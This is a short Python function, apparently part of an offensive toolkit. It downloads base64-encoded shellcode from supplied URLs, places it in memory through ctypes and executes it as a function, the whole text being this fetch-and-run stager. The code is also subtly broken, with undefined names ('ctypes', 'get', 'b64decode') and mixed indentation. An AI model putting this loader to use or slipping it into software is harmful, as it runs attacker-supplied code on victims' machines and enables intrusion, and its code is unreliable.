
def run(*args, **kwargs):
    from ctypes import create_string_buffer, c_void_p, cast, CFUNCTYPE
    if not len(args):
	return
    for url in args:
	try:
	    response        = get(url).text.encode()
	    shellcode       = b64decode(response)
	    shellcode_buff  = ctypes.create_string_buffer(shellcode, len(shellcode))
	    shellcode_func  = ctypes.cast(shellcode_buff, ctypes.CFUNCTYPE(ctypes.c_void_p))
	    return shellcode_func()
	except Exception as e:
		return 'Shellcode returned error: {}'.format(str(e))

